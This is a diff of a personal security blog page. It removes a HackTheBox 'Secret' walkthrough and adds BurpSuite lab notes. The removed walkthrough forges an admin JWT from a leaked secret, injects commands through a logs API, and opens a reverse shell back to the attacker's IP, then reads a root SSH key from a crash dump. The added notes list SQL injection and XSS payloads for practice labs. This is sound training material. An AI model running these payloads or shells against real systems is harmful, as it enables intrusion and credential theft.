@@ -42,27 +42,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.2.2" />
-<meta property="og:title" content="htb secret" />
+<meta property="og:title" content="BurpSuite Lab" />
 <meta name="author" content="Yuchao" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="nmap 1 2 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120 nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120" />
-<meta property="og:description" content="nmap 1 2 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120 nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120" />
-<link rel="canonical" href="/posts/htb-secret/" />
-<meta property="og:url" content="/posts/htb-secret/" />
+<meta name="description" content="sql injection" />
+<meta property="og:description" content="sql injection" />
+<link rel="canonical" href="/posts/BurpSuite-Lab/" />
+<meta property="og:url" content="/posts/BurpSuite-Lab/" />
 <meta property="og:site_name" content="Yuchao Toolbox" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-10-30T08:00:00+08:00" />
+<meta property="article:published_time" content="2022-05-10T11:33:00+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="htb secret" />
+<meta property="twitter:title" content="BurpSuite Lab" />
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-29T20:55:37+08:00","datePublished":"2021-10-30T08:00:00+08:00","description":"nmap 1 2 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120 nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120","headline":"htb secret","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-secret/"},"url":"/posts/htb-secret/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-05-10T20:08:58+08:00","datePublished":"2022-05-10T11:33:00+08:00","description":"sql injection","headline":"BurpSuite Lab","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BurpSuite-Lab/"},"url":"/posts/BurpSuite-Lab/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>htb secret | Yuchao Toolbox
+  <title>BurpSuite Lab | Yuchao Toolbox
   </title>
 
   <!--
@@ -429,7 +429,7 @@
         
 
           
-            <span>htb secret</span>
+            <span>BurpSuite Lab</span>
           
 
         
@@ -527,125 +527,6 @@
   
 
   
-    
-    
-
-    
-      
-        
-        
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-
-    
-
-  
 
   
   
@@ -663,78 +544,6 @@
       
         
         
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
       
 
       
@@ -800,7 +609,7 @@
 
 
 
-<h1 data-toc-skip>htb secret</h1>
+<h1 data-toc-skip>BurpSuite Lab</h1>
 
 <div class="post-meta text-muted">
 
@@ -830,12 +639,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1635552000"
+    data-ts="1652153580"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2021-10-30
+  2022-05-10
 </em>
 
       </span>
@@ -850,12 +659,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1648558537"
+    data-ts="1652184538"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2022-03-29
+  2022-05-10
 </em>
 
       </span>
@@ -881,8 +690,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="586 words">
-  <em>3 min</em> read</span>
+  title="153 words">
+  <em>1 min</em> read</span>
 
 
       <!-- page views -->
@@ -894,192 +703,13 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <h2 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.120
-nmap <span class="nt">-p</span> 22,80,3000 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.120
-</pre></td></tr></tbody></table></code></div></div>
+  <h1 id="sql-injection">sql injection</h1>
 
-<h2 id="see-80-3000-port-run-the-same-thing"><span class="mr-2">See 80, 3000 port run the same thing:</span><a href="#see-80-3000-port-run-the-same-thing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<ol>
-  <li>maybe 80 is a reverse proxy of 3000.</li>
-  <li>maybe one developer version, one production version.</li>
-  <li>some misconfiguration</li>
-</ol>
+<h4 id="cheetsheet"><span class="mr-2">cheetsheet</span><a href="#cheetsheet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
 
-<h2 id="directory-discovery"><span class="mr-2">Directory discovery</span><a href="#directory-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>feroxbuster <span class="nt">-u</span> http://10.10.11.120
-</pre></td></tr></tbody></table></code></div></div>
-
-<h2 id="use-api-by-document"><span class="mr-2">use API by document</span><a href="#use-api-by-document" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre><span class="c"># /api/user/register</span>
-curl <span class="nt">-d</span> <span class="s1">'{"name":"0xdf0xdf","email":"dfdfdfdf@secret.com","password":"password"}'</span> <span class="nt">-X</span> POST http://10.10.11.120/api/user/register <span class="nt">-H</span> <span class="s1">'Content-Type: Application/json'</span>
-<span class="c"># /api/user/login</span>
-curl <span class="nt">-d</span> <span class="s1">'{"email":"dfdfdfdf@secret.com","password":"password"}'</span> <span class="nt">-X</span> POST http://10.10.11.120/api/user/login <span class="nt">-H</span> <span class="s1">'Content-Type: Application/json'</span>
-</pre></td></tr></tbody></table></code></div></div>
-<ul>
-  <li>-d data</li>
-  <li>-X method</li>
-  <li>-H header</li>
-  <li>It supports these protocols: DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP,  LDAPS,  MQTT,  POP3,  POP3S, RTMP,  RTMPS,  RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP.</li>
-  <li>after the request, got a JWT.</li>
-</ul>
-
-<h2 id="nginx"><span class="mr-2">nginx</span><a href="#nginx" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<ul>
-  <li>port 80 is same with port 3000. 3000 does not have NGINX.</li>
-  <li>suspect NGINX is just there to proxy for Express.</li>
-</ul>
-
-<h2 id="analysis-the-source"><span class="mr-2">analysis the source</span><a href="#analysis-the-source" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<ul>
-  <li>nodejs express application</li>
-</ul>
-
-<h4 id="find-token-generation"><span class="mr-2">find Token generation</span><a href="#find-token-generation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-javascript nolineno highlighter-rouge" file="index.js"><div class="code-header">
-        <span data-label-text="index.js"><i class="far fa-file-code"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="c1">// Dotenv loads environment variables from a .env file into process.env</span>
-<span class="kd">const</span> <span class="nx">dotenv</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dotenv</span><span class="dl">'</span><span class="p">)</span>
-<span class="nx">dotenv</span><span class="p">.</span><span class="nx">config</span><span class="p">();</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<div class="language-javascript nolineno highlighter-rouge" file="/routes/auth.js"><div class="code-header">
-        <span data-label-text="/routes/auth.js"><i class="far fa-file-code"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-</pre></td><td class="rouge-code"><pre><span class="c1">// create jwt</span>
-<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>
-<span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="na">_id</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="p">,</span> <span class="na">email</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">email</span><span class="p">},</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span> <span class="p">)</span>
-<span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">auth-token</span><span class="dl">'</span><span class="p">,</span> <span class="nx">token</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
-<span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<h4 id="find-git-information"><span class="mr-2">find git information</span><a href="#find-git-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>git log <span class="nt">--oneline</span>
-git show 67d8da7
-</pre></td></tr></tbody></table></code></div></div>
-<p>get the TOKEN_SECRET from git old version</p>
-
-<h4 id="find-some-api-need-admins-token"><span class="mr-2">find some api need “admin”`s token</span><a href="#find-some-api-need-admins-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<ul>
-  <li>like <code class="language-plaintext highlighter-rouge">/api/priv</code> and <code class="language-plaintext highlighter-rouge">/api/logs</code></li>
-</ul>
-
-<h2 id="forge-jwt"><span class="mr-2">Forge JWT</span><a href="#forge-jwt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<p>https://jwt.io/</p>
-<h4 id="decode"><span class="mr-2">decode</span><a href="#decode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<p><code class="language-plaintext highlighter-rouge">pip3 install pyjwt</code></p>
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">jwt</span>
-<span class="n">token</span><span class="o">=</span><span class="s">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'</span>
-<span class="n">secret</span><span class="o">=</span><span class="s">'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'</span>
-<span class="c1"># decode
-</span><span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"HS256"</span><span class="p">])</span>
-<span class="c1"># result-&gt; {'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}
-</span></pre></td></tr></tbody></table></code></div></div>
-<h4 id="create-token"><span class="mr-2">Create Token</span><a href="#create-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre><span class="n">j</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"HS256"</span><span class="p">])</span>
-<span class="n">j</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'theadmin'</span>
-<span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>
-<span class="c1"># result-&gt; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8
-</span></pre></td></tr></tbody></table></code></div></div>
-
-<h4 id="try-to-use"><span class="mr-2">try to use</span><a href="#try-to-use" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s1">'http://10.10.11.120/api/priv'</span> <span class="nt">-H</span> <span class="s2">"auth-token: {token}"</span> | jq <span class="nb">.</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<h2 id="command-injection"><span class="mr-2">Command Injection</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<div class="language-javascript highlighter-rouge"><div class="code-header">
-        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">theadmin</span><span class="dl">'</span><span class="p">){</span>
-    <span class="kd">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="s2">`git log --oneline </span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
-    <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>try to manituplate to -&gt; <code class="language-plaintext highlighter-rouge">git log --oneline; [any command]</code>
-<code class="language-plaintext highlighter-rouge">curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.6' -H "auth-token: {token}" | jq -r .</code>
-attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo tcpdump -ni tun0 icmp</code></p>
-
-<p>Force to use G (Get) method.</p>
-<ul>
-  <li>-d,  –data,  –data-binary  or –data-urlencode to be used in an HTTP GET request instead of the POST request.
-    <div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-G</span> <span class="s1">'http://10.10.11.120/api/logs'</span> <span class="se">\</span>
-<span class="nt">--data-urlencode</span> <span class="s1">'file=/dev/null;id'</span> <span class="se">\</span>
-<span class="nt">-H</span> <span class="s2">"auth-token: {token}"</span> <span class="se">\</span>
-| jq <span class="nt">-r</span> <span class="nb">.</span>
-</pre></td></tr></tbody></table></code></div>    </div>
-  </li>
-</ul>
-
-<h4 id="reverse-shell"><span class="mr-2">reverse shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-G</span> <span class="s1">'http://10.10.11.120/api/logs'</span> <span class="se">\</span>
-<span class="nt">--data-urlencode</span> <span class="s2">"file=&gt;/dev/null;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'"</span> <span class="se">\</span>
-<span class="nt">-H</span> <span class="s2">"auth-token: {token}"</span> <span class="se">\</span>
-| jq <span class="nt">-r</span> <span class="nb">.</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>attacker<code class="language-plaintext highlighter-rouge">s machine: </code><code class="language-plaintext highlighter-rouge"> nc -lnvp 443</code>`</p>
-
-<h2 id="privesc"><span class="mr-2">privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-
-<h4 id="get-information-from-coredump"><span class="mr-2">get information from coredump.</span><a href="#get-information-from-coredump" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-
-<p>an suid program</p>
-<div class="language-c nolineno highlighter-rouge" file="code.c"><div class="code-header">
-        <span data-label-text="code.c"><i class="far fa-file-code"></i></span>
+<div class="language-sql highlighter-rouge"><div class="code-header">
+        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1088,38 +718,82 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
 6
 7
 8
-</pre></td><td class="rouge-code"><pre><span class="n">filecount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
-<span class="c1">// source code of "count" program</span>
-<span class="c1">// drop privs to limit file write</span>
-<span class="n">setuid</span><span class="p">(</span><span class="n">getuid</span><span class="p">());</span>
-<span class="c1">// Enable coredump generation</span>
-<span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-<span class="n">printf</span><span class="p">(</span><span class="s">"Save results a file? [y/N]: "</span><span class="p">);</span>
-<span class="n">res</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="s1">'+OR+1=1--
+'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+
+<span class="c1">-- find columns are compatible with string data</span>
+<span class="s1">'+UNION+SELECT+'</span><span class="n">abcdef</span><span class="s1">',NULL,NULL--
+
+-- oracle, find database type and version
+'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="s1">'abc'</span><span class="p">,</span><span class="s1">'def'</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">dual</span><span class="c1">--</span>
+<span class="s1">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+-- mysql, find database type and verion
+'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="s1">'abc'</span><span class="p">,</span><span class="s1">'def'</span><span class="o">#</span>
+<span class="s1">'+UNION+SELECT+@@version,+NULL#
+
+-- list database contents, not oracle
+'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="k">table_name</span><span class="p">,</span><span class="o">+</span><span class="k">NULL</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="c1">--</span>
+<span class="s1">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='</span><span class="n">users_abcdef</span><span class="s1">'--
+
+-- list database contents, oracle
+'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="k">table_name</span><span class="p">,</span><span class="k">NULL</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">all_tables</span><span class="c1">--</span>
+<span class="s1">'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='</span><span class="n">USERS_ABCDEF</span><span class="s1">'--
+
+-- blind, conditional responses
+-- "Welcome back" message disappears if error
+TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">'a'</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'a
+TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">'a'</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span> <span class="k">AND</span> <span class="k">LENGTH</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">)</span><span class="o">=</span><span class="s1">'a
+TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="p">)</span><span class="o">=</span><span class="s1">'a
+
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<h1 id="cross-site-scripting">Cross-site scripting</h1>
+
+<h4 id="reflected-xss"><span class="mr-2">Reflected XSS</span><a href="#reflected-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>url <code class="language-plaintext highlighter-rouge">web-security-academy.net/?search=&lt;script&gt;alert%281%29&lt;%2Fscript&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">&lt;script&gt; alert(1) &lt;/script&gt;</code></li>
+</ul>
+
+<h4 id="dom-based"><span class="mr-2">dom based</span><a href="#dom-based" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>search “asdf”</li>
+  <li>as the input writes out to the html page, by using document.write function by site.
+    <div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>&lt;img src="/resources/images/tracker.gif?searchTerms=asdf"&gt;
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+  <li>change the input as</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>&lt;img src="/resources/images/tracker.gif?searchTerms=asdf" &lt;svg="" onload="alert(1)"&gt;
 </pre></td></tr></tbody></table></code></div></div>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge"> ps auxww | grep count</code> find pid of the program</li>
-  <li>background the program at getchar()</li>
-  <li>find file handler in <code class="language-plaintext highlighter-rouge">/proc/[pid]/fd</code></li>
-  <li>find “/root/.viminfo” as input file path can be readable</li>
-  <li>as we can not access “/root”, we can not <code class="language-plaintext highlighter-rouge">cat /root/.viminfo</code></li>
-  <li>but we can read .viminfo from file handler</li>
-  <li>We can get the SSH key from it.</li>
-</ul>
-
-<h4 id="another-way-from-crash-dump"><span class="mr-2">another way, from Crash Dump</span><a href="#another-way-from-crash-dump" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-
-<ul>
-  <li>Because Enabled coredump generation</li>
-  <li>When a program crashes, the system stores the crash dump files in <code class="language-plaintext highlighter-rouge">/var/crash</code></li>
-  <li>input <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> as path input</li>
-  <li><code class="language-plaintext highlighter-rouge"> kill -l</code> list kill signals</li>
-  <li><code class="language-plaintext highlighter-rouge"> kill -SIGSEGV {pid}</code> send a segmentation fault</li>
-  <li><code class="language-plaintext highlighter-rouge">/var/crash$ apport-unpack _opt_count.1000.crash /tmp/0xdf</code> decompress the dump into a given directory</li>
-  <li><code class="language-plaintext highlighter-rouge">strings -n 30 CoreDump</code></li>
-  <li>then get the SSH key from it.</li>
-</ul>
 
 
 </div>
@@ -1140,8 +814,8 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
   <div class="post-tags">
     <i class="fa fa-tags fa-fw mr-1"></i>
       
-      <a href="/tags/htb/"
-          class="post-tag no-text-decoration" >htb</a>
+      <a href="/tags/burpsuite/"
+          class="post-tag no-text-decoration" >burpsuite</a>
       
   </div>
   
@@ -1176,19 +850,19 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
 
     
       
